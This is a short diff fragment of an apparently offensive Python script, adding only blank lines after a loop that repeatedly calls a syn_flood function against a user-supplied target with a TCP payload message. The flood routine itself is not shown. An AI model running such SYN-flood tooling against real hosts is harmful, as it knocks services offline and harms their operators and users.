@@ -21,3 +21,6 @@ message = input("[*] Enter message for TCP pay load ")
 
 while True:
     syn_flood(source, target, message)
+    
+    
+    
